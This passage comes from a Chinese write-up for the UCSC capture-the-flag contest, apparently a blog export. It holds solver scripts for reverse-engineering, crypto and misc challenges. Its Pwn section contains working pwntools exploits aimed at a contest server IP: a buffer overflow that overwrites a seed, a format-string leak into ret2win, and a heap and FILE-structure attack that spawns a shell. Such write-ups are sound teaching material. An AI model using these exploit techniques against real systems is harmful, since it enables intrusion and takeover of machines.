\"n=<;:h2<'?8:?'9hl9'h:l>'2>>2>hk=>;:?\";\n    for (int i = 0; i < 36; i++)\n        a[i] ^= 10;\n    printf(\"%.37s\\n\", a);\n    // d7610b86-5205-3bf3-b0f4-84484ba74105\n    return 0;\n}\n```\n\n### EZ_debug-ucsc\n\n断点此处单步运行得到flag\n\n![img](/images/1745240699574-7.png)\n\n![img](/images/1745240699575-8.png)\n\n### re_ez-ucsc\n\n单步跟到主要函数\n\n这边循环输入字符，判断(Inputchar - 32)^3是否<4，这边可以得出一共就四个符合条件的字符\n\n```C++\n' ', '!', '\\\"', '#'\n```\n\n要经过一系列输入数据，并且数据变换最终要v0==3，然后输出以下内容。\n\n![img](/images/1745240699575-9.png)\n\n![img](/images/1745240699575-10.png)\n\n输入的字符串md5就是flag。\n\n那么直接爆破输入，让最后v0等于3即可得到目标系列字符串。\n\n```c++\n#include <iostream>\n#include <vector>\n#include <string>\n#include <functional>\n\nint main()\n{\n    unsigned long long k[5] = {\n        0xFFFFFFFFFFFFFFFB, 0x0000000000000005, 0xFFFFFFFFFFFFFFFF, 0x0000000000000001,\n        0x0000000000000000};\n\n    char chars[4] = {'#', '\"', '!', ' '};\n    for (int len = 1; len <= 10; len++)\n    {\n        std::vector<std::vector<int>> combinations;\n        std::vector<int> current(len);\n\n        std::function<void(int)> generate = [&](int pos)\n        {\n            if (pos == len)\n            {\n                combinations.push_back(current);\n                return;\n            }\n\n            for (int i = 0; i < 4; i++)\n            {\n                current[pos] = i;\n                generate(pos + 1);\n            }\n        };\n\n        generate(0);\n\n        for (const auto &comb : combinations)\n        {\n            unsigned int map[25] = {\n                0x00000001, 0x00000000, 0x00000001, 0x00000000, 0x00000001,\n                0x00000001, 0x00000000, 0x00000001, 0x00000000, 0x00000001,\n                0x00000001, 0x00000000, 0x00000001, 0x00000000, 0x00000001,\n                0x00000001, 0x00000000, 0x00000000, 0x00000000, 0x00000001,\n                0x00000001, 0x00000001, 0x00000001, 0x00000001, 0x00000001};\n\n            unsigned long long v0 = 1;\n            std::string a;\n            bool valid = true;\n\n            for (int i = 0; i < len; i++)\n            {\n                char c = chars[comb[i]];\n                a.push_back(c);\n\n                uint8_t v = c;\n                uint8_t v13 = (v - 32) ^ 3;\n                v0 += k[v13];\n\n                if (v0 > 0x18 || map[v0])\n                {\n                    valid = false;\n                    break;\n                }\n\n                map[v0] = 1;\n\n                if (v0 == 3)\n                {\n                    std::cout << a << std::endl;\n                    return 0;\n                }\n            }\n        }\n    }\n    return 0;\n}\n// \"\"\"  ###\n```\n\n![img](/images/1745240699575-11.png)\n\n# Pwn\n\n### **BoFido-ucsc**\n\n开始输入有溢出，可以把随机种子改为任意值。把种子设为0这样就能通关了\n\nexp\n\n```python\nfrom pwn import *\n\ncontext(arch='amd64',os='linux')\ncontext.log_level=\"INFO\"\ncontext.terminal = [\"tmux\", \"splitw\", \"-h\"]\n#io=process(\"./chal\")\n#io=remote(\"dicec.tf\", 32030)\n\nr = lambda a : io.recv(a)\nrl = lambda    a=False        : io.recvline(a)\nru = lambda a,b=True    : io.recvuntil(a,b)\ns = lambda x            : io.send(x)\nsl = lambda x            : io.sendline(x)\nsa = lambda a,b            : io.sendafter(a,b)\nsla = lambda a,b        : io.sendlineafter(a,b)\nshell = lambda            : io.interactive()\ndef debug(script=\"\"):\n        gdb.attach(io, gdbscript=script)\n\ndef bunny(idx):\n        sla(\">\", str(idx))\n        #idx=idx\n\nans=\"\"\n\nval=[]\npredict=process([\"./predict\", \"100\"])\nfor i in range(100):\n        a=predict.recvline(False)\n        #print hex(int(a[1]))\n        val.append(int(a))\n\nio=remote(\"39.107.58.236\", 44590)\n#io=process(\"./BoFido\")\n\np=\"A\"*20+p64(0)*2\nsa(\":\", p)\n\nfor i in range(0, 30, 3):\n        p=str(val[i])+\" \"+str(val[i+1])+\" \"+str(val[i+2])\n        sl(p)\n\nshell()\n```\n\n预判exp\n\n```c++\n#include <stdint.h>\n#include <stdio.h>\n#include <stdlib.h>\n#include <stdbool.h>\n#include <time.h>\n#include <unistd.h>\n\nint main(int argc, char * argv[]){\n        uint8_t dmg;\n\n        for(int i=0;i<atoi(argv[1]);i++){\n                //int item = rand() % 4;\n                dmg = rand() % 255;\n                printf(\"%d\\n\", dmg);\n        }\n}\n```\n\n### **userlogin-ucsc**\n\n登陆普通用户有格式化字符串漏洞，泄漏root密码打ret2win\n\n```python\nfrom pwn import *\n\ncontext(arch='amd64',os='linux')\ncontext.log_level=\"INFO\"\ncontext.terminal = [\"tmux\", \"splitw\", \"-h\"]\n#io=process(\"\")\nio=remote(\"39.107.58.236\", 42744)\n\nr = lambda a : io.recv(a)\nrl = lambda    a=False        : io.recvline(a)\nru = lambda a,b=True    : io.recvuntil(a,b)\ns = lambda x            : io.send(x)\nsl = lambda x            : io.sendline(x)\nsa = lambda a,b            : io.sendafter(a,b)\nsla = lambda a,b        : io.sendlineafter(a,b)\nshell = lambda            : io.interactive()\ndef debug(script=\"\"):\n        gdb.attach(io, gdbscript=script)\n\nsla(\":\", \"supersecureuser\")\nrl()\nsl(\"%13$s\")\nroot=rl()\nprint root\n\nrop=\"A\"*40+p64(0x0401276)+p64(0x0401261)\n\nsla(\":\", root)\nsla(\":\", rop)\n\n\nshell()\n```\n\n### **疯狂复制-ucsc**\n\nedit函数有整数溢出，添负数可以控制stdout和stdin结构题。先塞满0x90的tcache，再释放0x90大小的堆块来让他到unsorted bin，再创在一个堆块来拿到libc泄漏，最后更改stdout打io。\n\n```python\nfrom pwn import *\n\ncontext(arch='amd64',os='linux')\ncontext.log_level=\"INFO\"\ncontext.terminal = [\"tmux\", \"splitw\", \"-h\"]\n#io=process(\"./chal\")\nlibc=ELF(\"./libc.so.6\")\nio=remote(\"39.107.58.236\", 45181)\n\nr = lambda a : io.recv(a)\nrl = lambda    a=False        : io.recvline(a)\nru = lambda a,b=True    : io.recvuntil(a,b)\ns = lambda x            : io.send(x)\nsl = lambda x            : io.sendline(x)\nsa = lambda a,b            : io.sendafter(a,b)\nsla = lambda a,b        : io.sendlineafter(a,b)\nshell = lambda            : io.interactive()\ndef debug(script=\"\"):\n        gdb.attach(io, gdbscript=script)\n\ndef add(idx, size):\n        sla(\":\", \"1\")\n        sla(\":\", str(idx))\n        sla(\"Size\", str(size))\n\ndef edit(idx, content):\n        sla(\":\", \"2\")\n        sla(\":\", str(idx))\n        sla(\":\", content)\n\ndef free(idx):\n        sla(\":\", \"4\")\n        sla(\":\", str(idx))\n\ndef view(idx):\n        sla(\":\", \"3\")\n        sla(\":\", str(idx))\n\nfor i in range(8):\n        add(i, 0x80)\nadd(8, 0x10)\n\nfor i in range(8):\n        free(i)\n\nadd(0, 0x30)\nview(0)\nru(\": \")\nlibc.address=u64(r(6).ljust(8, \"\\0\"))-0x3ebd20\nprint hex(libc.address)\n\n\"\"\"\nfake_io=flat({\n        0x0: \" sh;\",\n        0x68: libc.symbols['system'],\n        0x88: libc.sym[\"environ\"]-0x10,\n        0xa0: libc.symbols['_IO_2_1_stdout_'],\n        0xd8: libc.sym[\"_IO_wfile_jumps\"]-0x20,\n        0xe0: libc.symbols['_IO_2_1_stdout_']\n}, filler=\"\\0\")\n\"\"\"\n\nfake_io = flat({\n    0x0: b'  sh;',\n    0x8: libc.symbols['_IO_2_1_stdout_'] - 0x10,\n    0x28: libc.symbols['system'],\n    0x68: libc.symbols['system'],\n    0x88: libc.symbols['_environ']-0x10,\n    0xa0: libc.symbols['_IO_2_1_stdout_'] - 0x60,\n    0xd0: libc.symbols['_IO_2_1_stdout_'],\n    0xd8: libc.symbols['_IO_wfile_jumps'] - 0x20,\n}, filler=b\"\\x00\")\n\n\nfree(0)\nfree(8)\nfor i in range(32):\n        add(i, 0x20)\n\n#debug(\"break *_IO_wdoallocbuf\\nc\")\nedit(-4, fake_io)\n#debug()\nshell()\n```\n\n# Misc\n\n### **USB-ucsc**\n\nCTF-NetA一把梭\n\n![img](/images/1745240699575-12.png)\n\nflag{ebdfea9b-3469-41c7-9070-d7833ecc6102}\n\n### **小套不是套-ucsc**\n\n对套.zip执行CRC32爆破。\n\n代码：\n\n```python\nfrom binascii import crc32\nimport string\nimport zipfile\ndic=string.printable\ndef CrackCrc(crc):\n    for i in dic :\n        # print (i)\n        for j in dic:\n            for p in dic:\n                for q in dic:\n                    s=i+j+p+q\n                    # print (crc32(bytes(s,'ascii')) & 0xffffffff)\n                    if crc == (crc32(bytes(s,'ascii')) & 0xffffffff):\n                        print (s)\n                        return\n \ndef getcrc32(fname):\n    l=[]\n    file = fname\n    f = zipfile.ZipFile(file, 'r')\n    global fileList\n    fileList =f.namelist ()\n    print (fileList)\n    # print (type(fileList))\n    for filename in fileList:\n        Fileinfo = f.getinfo(filename)\n        # print(Fileinfo)\n        crc = Fileinfo.CRC\n        # print ('crc',crc)\n        l.append(crc)\n    return l\n \ndef main (filename=None):\n    l = getcrc32(filename)\n    # print(l)\n    for i in range(len(l)):\n        print(fileList[i], end='的内容是:')\n        CrackCrc(l[i])\n \nif __name__  == \"__main__\":\n    main ('test.zip')\n```\n\n![img](/images/1745240699575-13.png)\n\n按照f后面数字的顺序拼接起来，随后cyberchef一把梭：\n\n![img](/images/1745240699575-14.png)\n\n另一个压缩包打开之后里面还有一个压缩包，伪加密解出来是一张图：\n\n![img](/images/1745240699575-15.jpeg)\n\n010，发现还有一张图。\n\n![img](/images/1745240699575-16.png)\n\n补一下png头。能搞出来另外一张图：\n\n![img](/images/1745240699575-17.png)\n\nIEDN后面就是oursecret加密的特征\n\n![img](/images/1745240699575-18.png)\n\n结合上面的密钥。oursecret解出flag。\n\n![img](/images/1745240699575-19.png)\n\n### **three-ucsc**\n\npart1:8f02d3e7\n\n![img](/images/1745240699575-20.png)\n\n![img](/images/1745240699575-21.png)\n\npart2:-ce89-4d6b-830e-\n\n![img](/images/1745240699575-22.png)\n\npart3:5d0cb5695077\n\n压缩包密码thinkbell\n\n![img](/images/1745240699575-23.png)\n\n### No.shArk-ucsc\n\n![img](/images/1745240699575-24.png)\n\n流量中存在0101数据，转成二维码，修复完二维码扫描得到一个字符串\"Y0U_Fi8d_ItHa@aaHH\"。\n\n![img](/images/1745240699575-25.png)\n\n![img](/images/1745240699575-26.png)\n\n流量中提取出三个文件和一个存在SNOW数据的html。\n\n发现有SNOW隐写提示，使用SNOW解密出后半部分flag。\n\n![img](/images/1745240699575-27.png)\n\n![img](/images/1745240699575-28.png)\n\n![img](/images/1745240699576-29.png)\n\n结合提示，猜测另一个png图是要用Arnold Cat map变化来爆破出正确flag图。\n\n百度找到的脚本直接可用（https://www.cnblogs.com/alexander17/p/18551089）。\n\n```python\nimport matplotlib.pyplot as plt\nimport cv2\nimport numpy as np\n\ndef arnold_decode(image, shuffle_times, a, b):\n    \"\"\" decode for rgb image that encoded by Arnold\n    Args:\n        image: rgb image encoded by Arnold\n        shuffle_times: how many times to shuffle\n    Returns:\n        decode image\n    \"\"\"\n    # 1:创建新图像\n    decode_image = np.zeros(shape=image.shape)\n    # 2：计算N\n    h, w = image.shape[0], image.shape[1]\n    N = h  # 或N=w\n\n    # 3：遍历像素坐标变换\n    for time in range(shuffle_times):\n        for ori_x in range(h):\n            for ori_y in range(w):\n                # 按照公式坐标变换\n                new_x = ((a * b + 1) * ori_x + (-b) * ori_y) % N\n                new_y = ((-a) * ori_x + ori_y) % N\n                decode_image[new_x, new_y, :] = image[ori_x, ori_y, :]\n        image = np.copy(decode_image)\n        \n    return image\n\ndef arnold_brute(image,shuffle_times_range,a_range,b_range):\n    for c in range(shuffle_times_range[0],shuffle_times_range[1]):\n        for a in range(a_range[0],a_range[1]):\n            for b in range(b_range[0],b_range[1]):\n                print(f\"[+] Trying shuffle_times={c} a={a} b={b}\")\n                decoded_img = arnold_decode(image,c,a,b)\n                output_filename = f\"flag_decodedc{c}_a{a}_b{b}.png\"\n                cv2.imwrite(output_filename, decoded_img, [int(cv2.IMWRITE_PNG_COMPRESSION), 0])\n                \nif __name__ == \"__main__\":\n    img = cv2.imread(\"cat.png\")\n    arnold_brute(img, (1,8), (1,12), (1,12))\n```\n\n![img](/images/1745240699576-30.png)\n\n![img](/images/1745240699576-31.png)\n","slug":"ucsc-不知道-WP","published":1,"updated":"2025-04-21T13:05:14.520Z","comments":1,"layout":"post","photos":[],"_id":"cm9r3mmer0007f0lsgorubwi3","content":"<h1 id=\"战队名：不知道\"><a href=\"#战队名：不知道\" class=\"headerlink\" title=\"战队名：不知道\"></a>战队名：不知道</h1><p><strong>排名</strong>：<strong>1</strong></p>\n<p><img src=\"/images/7918DA86D3B117713C82E1F48AA03B79-1745240699577-65.png\" alt=\"7918DA86D3B117713C82E1F48AA03B79\" loading=\"lazy\"></p>\n<h1 id=\"Crypto\"><a href=\"#Crypto\" class=\"headerlink\" title=\"Crypto\"></a>Crypto</h1><h3 id=\"XR4-ucsc\"><a href=\"#XR4-ucsc\" class=\"headerlink\" title=\"XR4-ucsc\"></a><strong>XR4-ucsc</strong></h3><p>已知密钥，修改random_num逻辑异或回去即可</p>\n<pre class=\"language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">import</span> base64\n<span class=\"token keyword\">import</span> random\n<span class=\"token comment\"># from secret import flag</span>\n<span class=\"token keyword\">import</span> numpy <span class=\"token keyword\">as</span> np\n<span class=\"token keyword\">def</span> <span class=\"token function\">init_sbox</span><span class=\"token punctuation\">(</span>key<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    s_box <span class=\"token operator\">=</span> <span class=\"token builtin\">list</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">256</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    j <span class=\"token operator\">=</span> <span class=\"token number\">0</span>\n    <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">256</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        j <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>j <span class=\"token operator\">+</span> s_box<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token builtin\">ord</span><span class=\"token punctuation\">(</span>key<span class=\"token punctuation\">[</span>i <span class=\"token operator\">%</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>key<span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span> <span class=\"token number\">256</span>\n        s_box<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> s_box<span class=\"token punctuation\">[</span>j<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> s_box<span class=\"token punctuation\">[</span>j<span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> s_box<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span>\n    <span class=\"token keyword\">return</span> s_box\n<span class=\"token keyword\">def</span> <span class=\"token function\">decrypt</span><span class=\"token punctuation\">(</span>cipher<span class=\"token punctuation\">,</span> box<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    res <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span>\n    i <span class=\"token operator\">=</span> j <span class=\"token operator\">=</span> <span class=\"token number\">0</span>\n    cipher_bytes <span class=\"token operator\">=</span> base64<span class=\"token punctuation\">.</span>b64decode<span class=\"token punctuation\">(</span>cipher<span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">for</span> s <span class=\"token keyword\">in</span> cipher_bytes<span class=\"token punctuation\">:</span>\n        i <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>i <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span> <span class=\"token number\">256</span>\n        j <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>j <span class=\"token operator\">+</span> box<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span> <span class=\"token number\">256</span>\n        box<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> box<span class=\"token punctuation\">[</span>j<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> box<span class=\"token punctuation\">[</span>j<span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> box<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span>\n        t <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>box<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> box<span class=\"token punctuation\">[</span>j<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span> <span class=\"token number\">256</span>\n        k <span class=\"token operator\">=</span> box<span class=\"token punctuation\">[</span>t<span class=\"token punctuation\">]</span>\n        res<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span><span class=\"token builtin\">chr</span><span class=\"token punctuation\">(</span>s <span class=\"token operator\">^</span> k<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">return</span> <span class=\"token punctuation\">(</span><span class=\"token string\">''</span><span class=\"token punctuation\">.</span>join<span class=\"token punctuation\">(</span>res<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">def</span> <span class=\"token function\">random_num</span><span class=\"token punctuation\">(</span>seed_num<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    random<span class=\"token punctuation\">.</span>seed<span class=\"token punctuation\">(</span>seed_num<span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">for</span> j <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n            <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">chr</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>random<span class=\"token punctuation\">.</span>random<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token number\">10000</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">:</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> <span class=\"token punctuation\">(</span>transposed_matrix<span class=\"token punctuation\">[</span>j<span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>end<span class=\"token operator\">=</span><span class=\"token string\">''</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">if</span> __name__ <span class=\"token operator\">==</span> <span class=\"token string\">'__main__'</span><span class=\"token punctuation\">:</span>\n    transposed_matrix<span class=\"token operator\">=</span><span class=\"token punctuation\">[</span>\n<span class=\"token punctuation\">[</span>  <span class=\"token number\">1</span> <span class=\"token punctuation\">,</span><span class=\"token number\">111</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">38</span><span class=\"token punctuation\">,</span> <span class=\"token number\">110</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">95</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">44</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>\n<span class=\"token punctuation\">[</span> <span class=\"token number\">11</span><span class=\"token punctuation\">,</span>  <span class=\"token number\">45</span>  <span class=\"token punctuation\">,</span><span class=\"token number\">58</span><span class=\"token punctuation\">,</span>  <span class=\"token number\">39</span>  <span class=\"token punctuation\">,</span><span class=\"token number\">84</span><span class=\"token punctuation\">,</span>   <span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>\n<span class=\"token punctuation\">[</span><span class=\"token number\">116</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">19</span> <span class=\"token punctuation\">,</span><span class=\"token number\">113</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">60</span>  <span class=\"token punctuation\">,</span><span class=\"token number\">91</span> <span class=\"token punctuation\">,</span><span class=\"token number\">118</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>\n<span class=\"token punctuation\">[</span> <span class=\"token number\">33</span>  <span class=\"token punctuation\">,</span><span class=\"token number\">98</span>  <span class=\"token punctuation\">,</span><span class=\"token number\">38</span>  <span class=\"token punctuation\">,</span><span class=\"token number\">57</span>  <span class=\"token punctuation\">,</span><span class=\"token number\">10</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">29</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>\n<span class=\"token punctuation\">[</span> <span class=\"token number\">68</span>  <span class=\"token punctuation\">,</span><span class=\"token number\">52</span> <span class=\"token punctuation\">,</span><span class=\"token number\">119</span>  <span class=\"token punctuation\">,</span><span class=\"token number\">56</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">43</span> <span class=\"token punctuation\">,</span><span class=\"token number\">125</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>\n<span class=\"token punctuation\">[</span> <span class=\"token number\">32</span>  <span class=\"token punctuation\">,</span><span class=\"token number\">32</span><span class=\"token punctuation\">,</span>   <span class=\"token number\">7</span>  <span class=\"token punctuation\">,</span><span class=\"token number\">26</span><span class=\"token punctuation\">,</span>  <span class=\"token number\">41</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">41</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span>\n        \n    ciphertext <span class=\"token operator\">=</span> <span class=\"token string\">\"MjM184anvdA=\"</span>\n    key <span class=\"token operator\">=</span> <span class=\"token string\">\"XR4\"</span>\n    box <span class=\"token operator\">=</span> init_sbox<span class=\"token punctuation\">(</span>key<span class=\"token punctuation\">)</span>\n    a<span class=\"token operator\">=</span>decrypt<span class=\"token punctuation\">(</span>ciphertext<span class=\"token punctuation\">,</span> box<span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span>\n    random_num<span class=\"token punctuation\">(</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></code></pre>\n\n<h3 id=\"essential-ucsc\"><a href=\"#essential-ucsc\" class=\"headerlink\" title=\"essential-ucsc\"></a><strong>essential-ucsc</strong></h3><pre class=\"language-c++\" data-language=\"c++\"><code class=\"language-c++\">from Crypto.Util.number import *\nimport sympy\nfrom flag import flag\n\na&#x3D;getPrime(512)\np&#x3D;sympy.nextprime(13*a)\nq&#x3D;sympy.prevprime(25*a)\nnumber2&#x3D;p*q\n\ndef crypto01(number1, number2, number3):\n    number4 &#x3D; 1\n    while number2 &gt; 0:\n        if number2 % 2: \n            number4 &#x3D; (number4 * number1) % number3\n        number1 &#x3D; number1 ** 2 % number3\n        number2 &#x2F;&#x2F;&#x3D; 2\n    return number4\n\ndef crypto02(number1, number2):\n    number3 &#x3D; number1\n    number4 &#x3D; number2\n    giao &#x3D; 1\n    giaogiao &#x3D; 0\n    while number4 &gt; 0:\n        number7 &#x3D; number3 &#x2F;&#x2F; number4\n        giao, giaogiao &#x3D; giaogiao, giao - giaogiao*number7\n        number3, number4 &#x3D; number4, number3 - number4*number7\n    while giao&lt;0:\n        giao &#x3D; giao + number2\n    return giao\n\ndef crypto03(number1, number2, number3):\n    number4 &#x3D; crypto01(number3, number1, number2)\n    return number4\n\ndef crypto05(number1,number2):\n    return pow(number1,0xe18e,number2)\n\nnumber3 &#x3D; int.from_bytes(flag[0:19].encode(&quot;utf-8&quot;), &quot;big&quot;)\nnumber4 &#x3D; int.from_bytes(flag[19:39].encode(&quot;utf-8&quot;), &quot;big&quot;)\n\nprint(crypto03(number1, number2, number3))\nprint(crypto05(number4,number2))</code></pre>\n\n<p>简单看出给出的值为 n3^n1 %n2 和 n4 ^ 0xe18e % n2 </p>\n<p>前一个因为p，q的值与a相关，除以因子后开方得到近似值，第二部分因为flag长度较小，直接开方得到flag</p>\n<pre class=\"language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">from</span> Crypto<span class=\"token punctuation\">.</span>Util<span class=\"token punctuation\">.</span>number <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span>\nnumber1 <span class=\"token operator\">=</span> <span class=\"token number\">6035830951309638186877554194461701691293718312181839424149825035972373443231514869488117139554688905904333169357086297500189578624512573983935412622898726797379658795547168254487169419193859102095920229216279737921183786260128443133977458414094572688077140538467216150378641116223616640713960883880973572260683</span>\nnumber2 <span class=\"token operator\">=</span> <span class=\"token number\">20163906788220322201451577848491140709934459544530540491496316478863216041602438391240885798072944983762763612154204258364582429930908603435291338810293235475910630277814171079127000082991765275778402968190793371421104016122994314171387648385459262396767639666659583363742368765758097301899441819527512879933947</span>\n\n<span class=\"token comment\"># n3^n1 %n2</span>\nc1<span class=\"token operator\">=</span><span class=\"token number\">6624758244437183700228793390575387439910775985543869953485120951825790403986028668723069396276896827302706342862776605008038149721097476152863529945095435498809442643082504012461883786296234960634593997098236558840899107452647003306820097771301898479134315680273315445282673421302058215601162967617943836306076</span>\n<span class=\"token comment\"># n4 ^ 0xe18e % n2</span>\nc2<span class=\"token operator\">=</span><span class=\"token number\">204384474875628990804496315735508023717499220909413449050868658084284187670628949761107184746708810539920536825856744947995442111688188562682921193868294477052992835394998910706435735040133361347697720913541458302074252626700854595868437809272878960638744881154520946183933043843588964174947340240510756356766</span>\n<span class=\"token keyword\">from</span> gmpy2 <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span>\n\na<span class=\"token operator\">=</span>gmpy2<span class=\"token punctuation\">.</span>iroot<span class=\"token punctuation\">(</span>number2<span class=\"token operator\">//</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token operator\">*</span><span class=\"token number\">25</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span>\np<span class=\"token operator\">=</span>sympy<span class=\"token punctuation\">.</span>nextprime<span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token operator\">*</span>a<span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>number2<span class=\"token operator\">%</span>p<span class=\"token punctuation\">)</span>\nq<span class=\"token operator\">=</span>number2<span class=\"token operator\">//</span>p\n\nphi<span class=\"token operator\">=</span><span class=\"token punctuation\">(</span>p<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>q<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\nd1<span class=\"token operator\">=</span>inverse<span class=\"token punctuation\">(</span>number1<span class=\"token punctuation\">,</span>phi<span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>GCD<span class=\"token punctuation\">(</span><span class=\"token number\">0xe18e</span><span class=\"token punctuation\">,</span>phi<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\nd2<span class=\"token operator\">=</span>inverse<span class=\"token punctuation\">(</span><span class=\"token number\">0xe18e</span><span class=\"token operator\">//</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span>phi<span class=\"token punctuation\">)</span>\nm2<span class=\"token operator\">=</span><span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span>c2<span class=\"token punctuation\">,</span>d2<span class=\"token punctuation\">,</span>number2<span class=\"token punctuation\">)</span>\n\nf2<span class=\"token operator\">=</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>gmpy2<span class=\"token punctuation\">.</span>iroot<span class=\"token punctuation\">(</span>m2<span class=\"token punctuation\">,</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n\nf1<span class=\"token operator\">=</span><span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span>c1<span class=\"token punctuation\">,</span>d1<span class=\"token punctuation\">,</span>number2<span class=\"token punctuation\">)</span>\nflag<span class=\"token operator\">=</span>long_to_bytes<span class=\"token punctuation\">(</span>f1<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>long_to_bytes<span class=\"token punctuation\">(</span>f2<span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span></code></pre>\n\n<h3 id=\"MERGE-ECC–ucsc\"><a href=\"#MERGE-ECC–ucsc\" class=\"headerlink\" title=\"MERGE_ECC–ucsc\"></a><strong>MERGE_ECC–ucsc</strong></h3><pre class=\"language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">import</span> random\n<span class=\"token keyword\">from</span> sympy <span class=\"token 